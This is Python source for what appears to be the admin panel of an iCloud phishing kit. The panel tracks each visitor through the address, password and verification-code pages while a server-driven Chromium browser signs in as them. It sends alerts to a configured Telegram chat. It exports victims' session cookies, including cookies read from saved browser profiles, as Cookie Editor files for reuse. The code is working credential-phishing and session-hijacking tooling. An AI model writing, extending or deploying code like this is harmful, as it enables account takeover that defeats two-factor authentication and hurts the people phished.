"""The admin panel: the clients, the Telegram settings, and the cookies.

Everything the panel keeps is in one file on disk:

  * the admin's own secret - what /admin asks for before it says anything;
  * the Telegram bot token and the chat id;
  * the sessions that are allowed to have their cookies exported.

The file is written with the permissions of a secret (0600) and it is not in
the repository. Nothing here is ever written into a capture, and no capture
is ever read for it.

The panel shows what the server actually knows: the sessions the server has,
what each one is doing, and where its browser is. It does not make anything
up, and a session that has gone is still listed, so that the panel says what
happened rather than what is happening.

The panel listens. It subscribes to the session manager and the manager tells
it whenever something changes - a client connects, a client goes, a client
moves to the next step, a browser shows something new. The panel does not
ask the server the same question every two seconds to find out what it
already knows.
"""

import asyncio
import json
import os
import secrets
import time
from pathlib import Path

from fastapi import APIRouter, Request, WebSocket, WebSocketDisconnect
from fastapi.responses import FileResponse, JSONResponse

import sessions
from sessions import MANAGER, SESSION_ID, visitor_of

HERE = Path(__file__).parent


def __getattr__(name):
    """Where each visitor's browser keeps its profile.

    It lives in the session manager, so the server and the panel cannot
    disagree about it. It is read through this, rather than copied, so both
    always have the same folder in front of them.
    """
    if name == "PROFILES":
        return sessions.PROFILES
    raise AttributeError(f"module {__name__!r} has no attribute {name!r}")


# Where the settings live. The environment variable is for the secret only:
# a secret in a file on disk is a secret in a repository.
STORE_PATH = Path(os.environ.get("ICLOUD_ADMIN_STORE")
                  or (HERE / "admin.json")).resolve()
TOKEN_ENV = "ICLOUD_ADMIN_TOKEN"

# The cookie the admin's own secret is kept in. HttpOnly, so a script on the
# page cannot read it, and SameSite, so it does not travel to other places.
ADMIN_COOKIE = "icloud_admin"

# The panels' own stages, said the way a person would say them.
STAGES = {
    "/src/1.html": "Address",
    "/src/3.html": "Address",
    "/src/4.html": "Password",
    "/src/2.html": "Verification code",
}

# How many things have happened and are still worth showing.
EVENT_LIMIT = 200

EVENTS: list[dict] = []

# The panels that are listening. The server pushes to these when something
# changes, so the panel does not have to ask.
LISTENERS: set = set()


# --------------------------------------------------------------------------
# The store
# --------------------------------------------------------------------------

def _empty() -> dict:
    return {
        "admin_token": "",
        "telegram": {"token": "", "chat_id": "", "enabled": True},
        # The sessions whose cookies may be exported, said by name.
        "exports": {},
    }


class Store:
    """The panel's settings, on disk.

    The file is small and is read and written whole. It is written with
    the permissions of a secret, and it is written atomically, so that a
    crash halfway through cannot leave half a secret behind.
    """

    def __init__(self, path: Path = STORE_PATH):
        self.path = Path(path)
        self.data = _empty()
        self._seen = 0.0
        self.load()

    def load(self) -> None:
        """Read the settings again when the file has changed.

        The secret may be put in the file while the server is running, and
        the panel's own settings are written there - so the file is read
        again when it is newer than the last time it was read.
        """
        try:
            stamp = self.path.stat().st_mtime
        except OSError:
            return
        if stamp == self._seen:
            return
        self._seen = stamp
        try:
            raw = json.loads(self.path.read_text(encoding="utf-8"))
        except FileNotFoundError:
            return
        except Exception:
            # A file that cannot be read is not worth crashing over: the
            # panel starts empty and says so.
            return
        if isinstance(raw, dict):
            self.data = {**_empty(), **raw}

    def save(self) -> None:
        self.path.parent.mkdir(parents=True, exist_ok=True)
        temporary = self.path.with_suffix(".tmp")
        temporary.write_text(json.dumps(self.data, indent=2), encoding="utf-8")
        try:
            os.chmod(temporary, 0o600)
        except OSError:
            pass
        temporary.replace(self.path)
        try:
            os.chmod(self.path, 0o600)
        except OSError:
            pass

    # -- the admin's own secret -------------------------------------------

    def token(self) -> str:
        """The secret /admin asks for.

        The environment has it first: a secret that is in a file on disk is
        a secret that can be committed by accident.
        """
        self.load()
        return os.environ.get(TOKEN_ENV, "").strip() or \
            str(self.data.get("admin_token") or "").strip()

    def set_token(self, value: str) -> None:
        self.data["admin_token"] = value.strip()
        self.save()

    # -- Telegram ---------------------------------------------------------

    def telegram(self) -> dict:
        settings = self.data.get("telegram")
        if not isinstance(settings, dict):
            settings = {}
        return {
            "token": str(settings.get("token") or ""),
            "chat_id": str(settings.get("chat_id") or ""),
            "enabled": bool(settings.get("enabled", True)),
        }

    def set_telegram(self, token: str, chat_id: str, enabled: bool) -> None:
        self.data["telegram"] = {
            "token": token.strip(),
            "chat_id": chat_id.strip(),
            "enabled": bool(enabled),
        }
        self.save()

    # -- the exports ------------------------------------------------------

    def export_allowed(self, sid: str) -> bool:
        exports = self.data.get("exports")
        return bool(isinstance(exports, dict) and exports.get(sid))

    def set_export(self, sid: str, allowed: bool) -> None:
        exports = self.data.get("exports")
        if not isinstance(exports, dict):
            exports = {}
        if allowed:
            exports[sid] = True
        else:
            exports.pop(sid, None)
        self.data["exports"] = exports
        self.save()


STORE = Store()


# --------------------------------------------------------------------------
# What has happened
# --------------------------------------------------------------------------

def note(event: str, **fields) -> None:
    """Something worth seeing in the panel."""
    entry = {"at": time.time(), "event": event, **fields}
    EVENTS.append(entry)
    del EVENTS[:-EVENT_LIMIT]
    # The panel is told that this happened, and nothing else: it already
    # knows what the clients are, and it keeps its own copy up to date.
    _tell({"t": "note", "event": entry})


def push() -> None:
    """Tell every listening panel what the server knows now.

    The panel asked to be told, so this is the answer. It goes to all of
    them: they all want the same thing, and the list is the same for all.
    """
    drop_stale_listeners()
    if not LISTENERS:
        return
    expected = STORE.token()
    message = {"t": "state", "clients": client_list(), "events": events()}
    for listener in list(LISTENERS):
        # A line that was let in with a secret that is no longer the
        # secret does not get to keep listening.
        if expected and listener.secret and \
                not secrets.compare_digest(str(listener.secret), expected):
            LISTENERS.discard(listener)
            # 1008 is "this line is not allowed". The panel knows what to
            # say when it sees it.
            listener.close(1008)
            continue
        try:
            listener.put_nowait(message)
        except Exception:
            LISTENERS.discard(listener)


def _tell(message: dict) -> None:
    """Give one message to every panel that is listening."""
    drop_stale_listeners()
    expected = STORE.token()
    for listener in list(LISTENERS):
        if expected and listener.secret and \
                not secrets.compare_digest(str(listener.secret), expected):
            LISTENERS.discard(listener)
            listener.close(1008)
            continue
        try:
            listener.put_nowait(message)
        except Exception:
            LISTENERS.discard(listener)


def events(limit: int = 40) -> list[dict]:
    """The most recent things that happened, newest first."""
    return list(reversed(EVENTS[-limit:]))


# --------------------------------------------------------------------------
# The cookies
# --------------------------------------------------------------------------

def cookie_editor(cookies) -> list[dict]:
    """The browser's cookies as Cookie Editor's export.

    Cookie Editor reads a JSON array of these, and writes the same, so the
    file this makes can be dropped straight into it - and the cookies it
    holds can be put back into a browser by hand.
    """
    out = []
    for cookie in cookies or []:
        domain = str(cookie.get("domain") or "")
        entry = {
            "domain": domain,
            # A domain that starts with a dot is shared with the
            # subdomains; one that does not is only for that host.
            "hostOnly": not domain.startswith("."),
            "httpOnly": bool(cookie.get("httpOnly")),
            "name": str(cookie.get("name") or ""),
            "path": str(cookie.get("path") or "/"),
            "sameSite": None,
            "secure": bool(cookie.get("secure")),
            "session": not cookie.get("expires"),
            "storeId": None,
            "value": str(cookie.get("value") or ""),
        }
        expires = cookie.get("expires")
        if expires:
            entry["expirationDate"] = expires
        out.append(entry)
    return out


def mask(token: str) -> str:
    """A token, with most of it hidden: enough to tell two apart."""
    token = (token or "").strip()
    if len(token) <= 8:
        return "•" * len(token)
    return f"{token[:4]}••••••{token[-4:]}"


# --------------------------------------------------------------------------
# The panel
# --------------------------------------------------------------------------

def drop_stale_listeners() -> None:
    """Close the lines whose secret is no longer the secret.

    A secret that is changed is a secret the old lines were not given.
    They are closed - with the code that says so - rather than left
    carrying on with a secret that has been taken away.
    """
    expected = STORE.token()
    if not expected:
        return
    for listener in list(LISTENERS):
        if listener.secret and not secrets.compare_digest(
                str(listener.secret), expected):
            LISTENERS.discard(listener)
            listener.close(1008)


class PanelListener:
    """One panel, listening.

    Messages go through a queue, as they do for the capture's own viewers:
    a panel that has stopped reading must not hold up the server, and a
    full queue drops the oldest update rather than blocking.
    """

    def __init__(self, websocket: WebSocket, secret: str = ""):
        self.websocket = websocket
        # The secret this line was let in with. A secret that is changed
        # afterwards is a secret this line was not given, so the line is
        # closed rather than left carrying on.
        self.secret = secret
        self.queue: asyncio.Queue = asyncio.Queue(maxsize=50)
        self.task = asyncio.create_task(self._pump())

    async def _pump(self):
        while True:
            message = await self.queue.get()
            await self.websocket.send_json(message)

    def put_nowait(self, message: dict) -> None:
        try:
            self.queue.put_nowait(message)
        except asyncio.QueueFull:
            pass
        except Exception:
            pass

    def close(self, code: int = 1000) -> None:
        """Close the line, and say why when it was not allowed."""
        self.task.cancel()
        try:
            asyncio.ensure_future(self._close(code))
        except Exception:
            pass

    async def _close(self, code: int) -> None:
        """Close the line, quietly.

        A line that is already closed says so when it is closed again, and
        that "so" is an exception in a task nobody is waiting for. It is
        not worth a page of traceback in the server's log: the panel has
        gone, and that is all that happened.
        """
        try:
            await self.websocket.close(code=code)
        except Exception:
            pass


# --------------------------------------------------------------------------
# The panel listens to the session manager
# --------------------------------------------------------------------------

def _on_client_event(event: dict) -> None:
    """The session manager said something about a client.

    This is how the panel hears about it. The manager knows when a client
    connects, when one goes and when one changes - and the panel is told
    that, and no more, so it can say *when* a client connected instead of
    working it out for itself from a list of rows.
    """
    sid = event.get("id", "")
    what = event.get("event", "")
    if what == "connected":
        # A client who comes back is here, not gone.
        note("back" if event.get("returning") else "connected", session=sid)
    elif what == "left":
        note("gone", session=sid)
    row = _row_for(sid)
    if row is None:
        return
    # The row is sent with the event, so the panel can put it in its own
    # list without asking for anything.
    message = {"t": "client", "event": what, "id": sid,
               "at": event.get("at", 0.0), "client": row}
    _tell(message)


def _row_for(sid: str) -> dict | None:
    """What the panel shows of one client, whoever they are.

    A client who is here, a client who has gone, or a client whose
    profile is on disk: all of them are somebody the panel knows.
    """
    if not sid:
        return None
    session = MANAGER.sessions.get(sid)
    if session is not None:
        return client_row(session, STORE)
    record = MANAGER.gone.get(sid)
    if record is not None:
        return gone_row(sid, record, STORE)
    if SESSION_ID.match(sid) and (sessions.PROFILES / sid).is_dir():
        return offline_row(sid, STORE)
    return None


# The panel subscribes once, and the manager tells it from then on.
MANAGER.subscribe(_on_client_event)


def stage_of(session) -> str:
    """Where this session is, said the way a person would say it."""
    if session.hub.finished:
        return "Signed in"
    page = session.hub.page or ""
    return STAGES.get(page, "Starting")


def client_row(session, store: Store) -> dict:
    """What the panel shows of one session.

    "Active" means the browser is open and there is somebody in it. A
    session whose browser has been closed is not active, however recently
    it was here - and one that is being worked in is more active than one
    that has been left alone at the password step.
    """
    idle = max(0.0, time.monotonic() - session.seen)
    browser = session.hub.browser or {}
    browser_open = bool(session.state.get("browser_open"))
    viewers = len(session.hub.viewers)
    # When this client's current stay began - the manager knows, because
    # every client passes through it on the way in.
    connected_at = MANAGER.connected_at(session.id)
    return {
        "id": session.id,
        # Online means the server is driving this client's browser right
        # now. That is what "online" means here, and it is the difference
        # between a client the panel can watch and one it can only read.
        "online": browser_open,
        "status": ("active" if browser_open
                   else session.state.get("status", "idle")),
        "stage": stage_of(session),
        "page": session.hub.page,
        "step": session.state.get("step", ""),
        "error": session.state.get("error", ""),
        "browser_open": browser_open,
        "browser_url": browser.get("url", ""),
        "browser_title": browser.get("title", ""),
        "viewers": viewers,
        # Somebody is looking at the capture right now. This is what tells
        # the panel that a person is here, as opposed to a session that is
        # only still remembered.
        "here": viewers > 0,
        # When they arrived, and how long ago that was. The panel shows
        # this, so it can say when a client connected rather than only
        # that one is connected.
        "connected": True,
        "connected_at": connected_at,
        "connected_seconds": (round(max(0.0, time.time() - connected_at), 1)
                               if connected_at else 0.0),
        "waiting": bool(session.waiting),
        "finished": bool(session.hub.finished),
        "idle_seconds": round(idle, 1),
        "export_allowed": store.export_allowed(session.id),
        "profile": session.profile().name,
        "known": True,
    }


def gone_row(sid: str, record: dict, store: Store) -> dict:
    """What the panel shows of a visitor who is not here any more.

    A visitor whose browser has been shut down is still a visitor: their
    profile is on disk, their browser remembers them, and the panel says
    where they got to and when they were last here.
    """
    seen = record.get("seen")
    idle = max(0.0, time.time() - seen) if isinstance(seen, (int, float)) else 0.0
    connected_at = record.get("arrived", 0.0)
    return {
        "id": sid,
        "online": False,
        "status": "gone",
        "stage": record.get("stage", "—") if record else "Unknown",
        "page": record.get("page", ""),
        "step": "",
        "error": "",
        "browser_open": False,
        "browser_url": record.get("url", "") if record else "",
        "browser_title": record.get("title", "") if record else "",
        "viewers": 0,
        "waiting": False,
        "here": False,
        # They were here, and this is when they arrived. They are not here
        # now - but the panel can still say when it was.
        "connected": False,
        "connected_at": connected_at,
        "connected_seconds": (round(max(0.0, time.time() - connected_at), 1)
                               if connected_at else 0.0),
        "finished": bool(record.get("finished")) if record else False,
        "idle_seconds": round(idle, 1),
        "export_allowed": store.export_allowed(sid),
        "profile": sid,
        "known": False,
    }


def every_client(store: Store) -> list[dict]:
    """Every client the server knows about.

    A client is a visitor: their folder in ``visitors/`` is their
    browser's profile, and it is there whether they are here or not. The
    ones whose browser is running right now are **online** - the server is
    driving that browser, and the panel can say exactly where it is and
    what it is showing. The ones whose browser is shut down are
    **offline**: their profile is on disk, their cookies are in it, and
    the panel can still read them.

    So both are listed, and the panel says which is which.
    """
    rows = [client_row(session, store)
            for session in MANAGER.sessions.values()]

    seen = {row["id"] for row in rows}
    for sid, record in MANAGER.gone.items():
        if sid not in seen:
            rows.append(gone_row(sid, record, store))
            seen.add(sid)

    # The ones who have not been here since the server started: their
    # profile is on disk from an earlier run. They are still clients -
    # their cookies are in that folder - so they are on the list, and the
    # panel can open their profile and read them.
    try:
        for folder in sorted(sessions.PROFILES.iterdir()):
            if not folder.is_dir() or folder.name in seen:
                continue
            if not SESSION_ID.match(folder.name):
                continue
            rows.append(offline_row(folder.name, store))
            seen.add(folder.name)
    except Exception:
        pass

    # The ones who are here come first, and among them the ones whose
    # browser is running come before the ones whose browser is shut.
    rows.sort(key=lambda row: (not row["online"],
                                not row["browser_open"],
                                row["idle_seconds"]))
    return rows


def client_list() -> list[dict]:
    """The list of clients, for the panel that is listening."""
    return every_client(STORE)


def offline_row(sid: str, store: Store) -> dict:
    """A client whose browser is shut down but whose profile is on disk.

    Their folder in ``visitors/`` is their browser's memory: the cookies
    they had, the sign-in they did last time. It is on disk, so the panel
    can open it and read them, and it is not open now, so the panel cannot
    say where their browser is - only what they got to last time.
    """
    profile = sessions.PROFILES / sid
    return {
        "id": sid,
        "status": "offline",
        "stage": "Offline",
        "page": "",
        "step": "",
        "error": "",
        "browser_open": False,
        "browser_url": "",
        "browser_title": "",
        "viewers": 0,
        "waiting": False,
        "here": False,
        "online": False,
        # They are not here now. Their profile is on disk, but this server
        # has not seen them arrive, so there is no time to say.
        "connected": False,
        "connected_at": 0.0,
        "connected_seconds": 0.0,
        "finished": False,
        "idle_seconds": 0.0,
        "export_allowed": store.export_allowed(sid),
        "profile": sid,
        "known": True,
        "profile_path": str(profile),
    }


def _authed(request: Request, store: Store) -> bool:
    """Is this request the admin's?"""
    expected = store.token()
    if not expected:
        return False
    given = request.cookies.get(ADMIN_COOKIE, "")
    if not given:
        header = request.headers.get("x-admin-token", "")
        given = header
    return bool(given) and secrets.compare_digest(str(given), expected)


def _denied(message: str, status: int = 403):
    return JSONResponse({"error": message}, status_code=status)


def build_router() -> APIRouter:
    """The panel's routes."""
    router = APIRouter(prefix="/admin", tags=["admin"])

    @router.get("")
    @router.get("/")
    async def panel():
        """The panel itself. It holds no secrets: everything it shows comes
        from the API, and the API asks for the admin's secret."""
        return FileResponse(HERE / "admin.html",
                            headers={"Cache-Control": "no-store"})

    @router.get("/fonts.css")
    async def fonts():
        """The panel's own font.

        Space Grotesk is served from here and not from a font house: the
        panel is for the operator, and it should look the same whether the
        machine has a network or not. The font is in the stylesheet itself,
        so there is no file to go missing.
        """
        return FileResponse(HERE / "fonts.css", media_type="text/css",
                            headers={"Cache-Control": "public, max-age=604800"})

    # -- the admin's own secret -------------------------------------------

    @router.post("/api/login")
    async def login(request: Request):
        body = await _body(request)
        given = str(body.get("token") or "")
        expected = STORE.token()
        if not expected:
            return JSONResponse({
                "error": "no admin secret has been set. Set ICLOUD_ADMIN_TOKEN "
                         "in the environment, or put one in admin.json."
            }, status_code=503)
        if not given or not secrets.compare_digest(given, expected):
            return _denied("that is not the admin's secret")
        response = JSONResponse({"ok": True})
        response.set_cookie(
            ADMIN_COOKIE, given, httponly=True, samesite="strict",
            path="/", max_age=7 * 24 * 3600)
        return response

    @router.post("/api/logout")
    async def logout():
        response = JSONResponse({"ok": True})
        response.delete_cookie(ADMIN_COOKIE, path="/")
        return response

    @router.get("/api/session")
    async def session_info(request: Request):
        store = STORE
        if not _authed(request, store):
            return _denied("the admin's secret is needed")
        return {"ok": True, "token_set": bool(store.token())}

    # -- the clients ------------------------------------------------------

    @router.websocket("/ws")
    async def panel_socket(websocket: WebSocket):
        """The panel's line to the server.

        The panel asks to be told what the server knows, and the server
        tells it: when a client connects, when a client goes, when a client
        moves to the next step, when a browser shows something new. The
        panel does not ask the same question over and over to find out what
        the server already knows.

        The secret is asked for first. A line that is not let in is
        closed, and nothing is said on it.
        """
        given = websocket.cookies.get(ADMIN_COOKIE, "")
        expected = STORE.token()
        allowed = bool(expected and given and
                       secrets.compare_digest(str(given), expected))

        # The line is accepted first, and then closed if it is not allowed.
        # A line that is closed before it is accepted cannot be closed
        # with a code at all, and the panel would not know why.
        await websocket.accept()
        if not allowed:
            await websocket.close(code=1008)
            return

        listener = PanelListener(websocket, str(given))
        LISTENERS.add(listener)
        try:
            # What the server knows right now, so the panel does not have
            # to wait for the next thing to happen to find out.
            listener.put_nowait({"t": "state",
                                 "clients": client_list(),
                                 "events": events()})
            while True:
                # The panel has nothing to say - it only listens. But the
                # connection has to be read from, so that a closed one is
                # noticed and cleaned up.
                await websocket.receive_text()
        except WebSocketDisconnect:
            pass
        except Exception:
            pass
        finally:
            LISTENERS.discard(listener)
            listener.close()
    @router.get("/api/clients")
    async def clients(request: Request):
        store = STORE
        if not _authed(request, store):
            return _denied("the admin's secret is needed")
        rows = every_client(store)
        return {
            "clients": rows,
            "events": events(),
            "counts": {
                # Everybody the server knows about, here or gone.
                "total": len(rows),
                # Somebody is looking at the capture right now.
                "here": sum(1 for row in rows if row["here"]),
                # Their browser is open, whether or not they are watching.
                "active": sum(1 for row in rows if row["browser_open"]),
                # They have gone: the browser was closed and they left.
                "gone": sum(1 for row in rows if not row["known"]),
                "viewers": sum(row["viewers"] for row in rows),
                "finished": sum(1 for row in rows if row["finished"]),
                "errors": sum(1 for row in rows if row["status"] == "error"),
            },
        }

    # -- Telegram ---------------------------------------------------------

    @router.get("/api/telegram")
    async def telegram_get(request: Request):
        store = STORE
        if not _authed(request, store):
            return _denied("the admin's secret is needed")
        settings = store.telegram()
        return {
            "token_set": bool(settings["token"]),
            "token_masked": mask(settings["token"]),
            "chat_id": settings["chat_id"],
            "enabled": settings["enabled"],
        }

    @router.post("/api/telegram")
    async def telegram_save(request: Request):
        store = STORE
        if not _authed(request, store):
            return _denied("the admin's secret is needed")
        body = await _body(request)
        current = store.telegram()
        token = body.get("token")
        token = str(token).strip() if isinstance(token, str) and token.strip() \
            else current["token"]
        chat_id = body.get("chat_id")
        chat_id = str(chat_id).strip() if isinstance(chat_id, str) else \
            current["chat_id"]
        enabled = body.get("enabled")
        enabled = bool(enabled) if isinstance(enabled, bool) else current["enabled"]
        store.set_telegram(token, chat_id, enabled)
        return {
            "ok": True,
            "token_set": bool(store.telegram()["token"]),
            "token_masked": mask(store.telegram()["token"]),
            "chat_id": store.telegram()["chat_id"],
            "enabled": store.telegram()["enabled"],
        }

    @router.post("/api/telegram/test")
    async def telegram_test(request: Request):
        store = STORE
        if not _authed(request, store):
            return _denied("the admin's secret is needed")
        import telegram as telegram_module
        settings = store.telegram()
        if not settings["enabled"]:
            return _denied("the Telegram notifications are turned off")
        went, said = await telegram_module.send(
            settings["token"], settings["chat_id"],
            telegram_module.describe("The test message. The notifications work."))
        return {"ok": went, "said": said}

    # -- the cookies ------------------------------------------------------

    @router.get("/api/cookies")
    async def own_cookies(request: Request):
        """The cookies of the session this browser is signed in as.

        Their own session, and nobody else's: the visitor's name is in the
        request's cookie, and the session it names is the only one that is
        read.
        """
        store = STORE
        if not _authed(request, store):
            return _denied("the admin's secret is needed")
        sid = visitor_of(request)
        session = MANAGER.lookup(sid)
        if session is None:
            return _denied("this browser has no session of its own yet",
                           status=404)
        cookies = await cookies_of(session.id)
        return {"session": session.id, "cookies": cookie_editor(cookies)}

    @router.get("/api/clients/{sid}/cookies")
    async def client_cookies(sid: str, request: Request):
        """The cookies of a session that has been allowed to be exported.

        A session is not exported because somebody asked: it is exported
        because it has been allowed, by name, in the panel - or because the
        request is the session's own visitor.
        """
        store = STORE
        if not _authed(request, store):
            return _denied("the admin's secret is needed")
        if not known_client(sid):
            return _denied("there is no such client", status=404)
        if not store.export_allowed(sid) and visitor_of(request) != sid:
            return _denied("this client has not been allowed to be exported")
        cookies = await cookies_of(sid)
        session = MANAGER.sessions.get(sid)
        return {"session": sid, "cookies": cookie_editor(cookies),
                "online": bool(session
                               and session.state.get("browser_open"))}

    @router.post("/api/clients/{sid}/export")
    async def allow_export(sid: str, request: Request):
        """Allow a session's cookies to be exported, or say no."""
        store = STORE
        if not _authed(request, store):
            return _denied("the admin's secret is needed")
        if not known_client(sid):
            return _denied("there is no such client", status=404)
        body = await _body(request)
        allowed = bool(body.get("allowed"))
        store.set_export(sid, allowed)
        return {"ok": True, "export_allowed": store.export_allowed(sid)}

    return router


# The panel's routes, made once: the server mounts them, and the tests
# call them.
ROUTER = build_router()


# --------------------------------------------------------------------------
# The small helpers
# --------------------------------------------------------------------------

async def _body(request: Request) -> dict:
    try:
        raw = await request.body()
        parsed = json.loads(raw.decode("utf-8")) if raw else {}
    except Exception:
        return {}
    return parsed if isinstance(parsed, dict) else {}


async def _cookies_of(session) -> list[dict]:
    """The cookies this session's browser holds."""
    context = getattr(session, "ctx", None)
    if context is None:
        return []
    try:
        return await context.cookies()
    except Exception:
        return []


async def cookies_of(sid: str) -> list[dict]:
    """The cookies of a client, whether they are here or not.

    A client whose browser is running is asked for its cookies directly.

    A client whose browser is shut down still has them: they are in the
    profile folder on disk, and the folder is that browser's memory. So
    the folder is opened - quietly, without a window, and closed again
    straight away - and the cookies are read out of it. The profile that
    did the signing in is the profile that holds the sign-in.

    The cookies that were read while the browser was open are kept with
    the record of that client, and are used when the folder cannot be
    opened - which is the case when the browser is still holding it.
    """
    session = MANAGER.sessions.get(sid)
    if session is not None:
        cookies = await _cookies_of(session)
        if cookies:
            return cookies

    record = MANAGER.gone.get(sid) or {}
    kept = record.get("cookies")
    if isinstance(kept, list) and kept:
        return kept

    return await read_profile_cookies(sid)


async def read_profile_cookies(sid: str) -> list[dict]:
    """The cookies in a client's profile folder on disk.

    The folder is opened quietly - no window, nothing shown - and closed
    again as soon as the cookies have been read. It is the same folder the
    visitor's own browser uses, so the cookies in it are the cookies that
    browser had.
    """
    if not SESSION_ID.match(sid or ""):
        return []
    folder = sessions.PROFILES / sid
    if not folder.is_dir():
        return []

    from playwright.async_api import async_playwright

    context = None
    playwright = None
    try:
        playwright = await async_playwright().start()
        context = await playwright.chromium.launch_persistent_context(
            str(folder), headless=True, no_viewport=True,
            args=["--no-sandbox", "--disable-gpu"])
        return await context.cookies()
    except Exception:
        return []
    finally:
        try:
            if context is not None:
                await context.close()
        except Exception:
            pass
        try:
            if playwright is not None:
                await playwright.stop()
        except Exception:
            pass


def known_client(sid: str) -> bool:
    """Is this a client the server knows about?

    A client is a visitor: a session, a record of one that has gone, or a
    profile folder on disk. The folder is their browser's memory, so there
    is something real to be done with it - their cookies can be read out
    of it.
    """
    if sid in MANAGER.sessions or sid in MANAGER.gone:
        return True
    if not SESSION_ID.match(sid or ""):
        return False
    return (sessions.PROFILES / sid).is_dir()
